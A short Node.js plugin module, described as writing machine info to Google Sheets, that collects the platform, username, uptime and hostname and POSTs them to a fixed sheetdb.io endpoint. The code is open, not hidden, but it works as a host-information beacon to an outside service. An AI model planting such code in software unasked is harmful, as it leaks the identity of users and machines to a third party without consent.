/**
 * @name GoogleSheets
 * @description Write machine into to google sheets
 * @author Mikail Marynenko <0x77dev@protonmail.com>
 */

/*
    API provider: 
    https://sheetdb.io
    --------------------
    Google sheets demo:
    https://docs.google.com/spreadsheets/d/1u8ybcNqmvfPdwQeGW1ltohjNSPMD4hKdZj70aXsd2WQ/view
*/

const fetch = require("node-fetch");
const os = require("os");

module.exports = (_, callback) => {
  const raw = JSON.stringify({
    data: {
      platform: os.platform(),
      username: os.userInfo().username,
      uptime: os.uptime(),
      hostname: os.hostname(),
    },
  });
  const requestOptions = {
    method: "POST",
    body: raw,
    headers: {
      "Content-Type": "application/json",
    },
    redirect: "follow",
  };

  fetch("https://sheetdb.io/api/v1/xenqcqiv306e7", requestOptions)
    .then((response) => response.json())
    .then((result) => callback(result))
    .catch((error) => callback("error", error));
};
